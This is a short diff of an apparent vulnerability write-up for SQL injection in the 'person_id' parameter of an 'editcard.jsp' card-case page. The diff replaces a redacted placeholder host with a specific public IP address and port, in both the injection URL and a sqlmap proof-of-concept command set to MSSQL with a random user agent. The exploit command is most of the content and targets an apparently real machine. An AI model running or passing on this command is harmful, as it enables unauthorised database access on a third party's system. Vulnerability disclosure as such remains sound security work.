@@ -12,13 +12,14 @@ Code
 
 Injection：person_id
 
-Injection url: http://xx.xx.xx.xx:8081/cardcase/editcard.jsp?person_id=2&id=1&classid=1
+Injection url: http://125.69.99.250:8088/cardcase/editcard.jsp?person_id=2&id=1&classid=1
 
 
 poc:
-python .\sqlmap.py -u "http://xx.xx.xx.xx:8081/cardcase/editcard.jsp?person_id=2&id=1&classid=1" --random-agent --dbms=mssql
+python .\sqlmap.py -u "http://125.69.99.250:8088/cardcase/editcard.jsp?person_id=2&id=1&classid=1" --random-agent --dbms=mssql
+
+![sql](https://github.com/user-attachments/assets/294134a2-6cda-4215-ad39-becef72da11f)
 
 
-![sql](https://github.com/user-attachments/assets/7fcdcd69-5cfb-4088-baf7-7172e638fa53)
 
 
